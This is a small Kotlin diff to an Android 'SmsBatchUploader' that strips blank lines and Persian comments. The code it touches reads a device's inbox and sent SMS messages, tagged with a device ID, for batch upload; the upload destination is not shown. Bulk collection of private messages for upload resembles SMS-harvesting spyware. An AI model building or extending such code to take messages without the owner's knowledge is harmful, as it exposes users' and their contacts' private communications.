@@ -8,7 +8,6 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
-
 object SmsBatchUploader {
 
     private const val BATCH_SIZE = 200
@@ -23,7 +22,6 @@ object SmsBatchUploader {
     private var isCancelled = false
     private var isUploading = false
 
-
     suspend fun uploadQuickSms(
         context: Context,
         deviceId: String,
@@ -31,22 +29,20 @@ object SmsBatchUploader {
         limit: Int = 50
     ): UploadResult = withContext(Dispatchers.IO) {
         try {
-            // دریافت پیام‌های inbox
             val inboxMessages = fetchSmsFromBox(
                 context = context,
                 deviceId = deviceId,
                 box = Telephony.Sms.Inbox.CONTENT_URI,
                 type = "inbox",
-                limit = limit / 2  // نصف از inbox
+                limit = limit / 2
             )
 
-            // دریافت پیام‌های sent
             val sentMessages = fetchSmsFromBox(
                 context = context,
                 deviceId = deviceId,
                 box = Telephony.Sms.Sent.CONTENT_URI,
                 type = "sent",
-                limit = limit / 2  // نصف از sent
+                limit = limit / 2
             )
 
             val allMessages = inboxMessages + sentMessages
